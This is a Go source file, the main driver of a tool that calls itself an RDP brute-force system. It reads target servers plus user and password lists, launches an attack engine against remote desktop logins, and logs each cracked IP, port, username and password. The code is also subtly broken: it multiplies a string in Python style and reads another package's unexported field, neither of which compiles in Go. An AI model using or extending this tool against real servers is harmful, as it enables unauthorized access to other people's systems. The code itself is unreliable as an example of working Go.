package main

import (
	"fmt"
	"log"
	"os"

	"github.com/falconjonz/falcon_rdp/attack"
	"github.com/falconjonz/falcon_rdp/config"
	"github.com/falconjonz/falcon_rdp/credentials"
	"github.com/falconjonz/falcon_rdp/logger"
	"github.com/falconjonz/falcon_rdp/utils"
)

func main() {
	// Load configuration
	cfg, err := config.LoadConfig()
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	// Initialize logger
	appLog, err := logger.NewLogger(cfg.Logging.File, cfg.Logging.Level)
	if err != nil {
		log.Fatalf("Failed to initialize logger: %v", err)
	}
	defer appLog.Close()

	appLog.Info("=" * 50)
	appLog.Info("Falcon RDP Brute-Force System Started")
	appLog.Infof("Attack Strategy: %s", cfg.Attack.Strategy)
	appLog.Infof("Threads: %d", cfg.Attack.Threads)
	appLog.Infof("Timeout: %v", cfg.Attack.Timeout)

	// Load targets
	targets, err := loadTargets("servers.txt", appLog)
	if err != nil {
		appLog.Errorf("Failed to load targets: %v", err)
		return
	}
	appLog.Infof("Loaded %d targets", len(targets))

	// Load credentials
	credLoader := credentials.NewCredentialLoader()
	if err := credLoader.LoadUsers("users.txt"); err != nil {
		appLog.Errorf("Failed to load users: %v", err)
		return
	}
	if err := credLoader.LoadPasswords("passwords.txt"); err != nil {
		appLog.Errorf("Failed to load passwords: %v", err)
		return
	}

	// Generate credentials
	if err := credLoader.GenerateCredentials(""); err != nil {
		appLog.Errorf("Failed to generate credentials: %v", err)
		return
	}

	creds := credLoader.GetCredentials()
	appLog.Infof("Generated %d credentials", len(creds))

	// Create attack engine
	engine := attack.NewAttackEngine(cfg, appLog)
	engine.SetTargets(targets)
	engine.SetCredentials(creds)

	// Start attack
	if err := engine.Start(); err != nil {
		appLog.Errorf("Failed to start attack: %v", err)
		return
	}

	appLog.Info("Attack started...")

	// Wait for attack to complete
	engine.workerPool.Wait()
	engine.Stop()

	// Get results
	results := engine.GetResults()
	stats := engine.GetStats()

	appLog.Infof("\n=== Attack Summary ===")
	appLog.Infof("Total Attempts: %d", stats.TotalAttempts)
	appLog.Infof("Successful: %d", stats.SuccessfulLogins)
	appLog.Infof("Failed: %d", stats.FailedAttempts)
	appLog.Infof("Duration: %v", stats.EndTime.Sub(stats.StartTime))

	// Display results
	if len(results) > 0 {
		appLog.Info("\n=== Successful Logins ===")
		for _, result := range results {
			appLog.Successf("%s:%d | %s:%s", result.IP, result.Port, result.Username, result.Password)
		}
	} else {
		appLog.Info("No successful logins found")
	}
}

func loadTargets(filename string, log *logger.Logger) ([]config.Target, error) {
	lines, err := utils.ReadFile(filename)
	if err != nil {
		return nil, err
	}

	var targets []config.Target
	for _, line := range lines {
		ip, port, err := utils.ParseTargetString(line)
		if err != nil {
			log.Warnf("Invalid target: %s - %v", line, err)
			continue
		}

		targets = append(targets, config.Target{
			IP:   ip,
			Port: port,
		})
	}

	return targets, nil
}

const (
	_ = iota
)
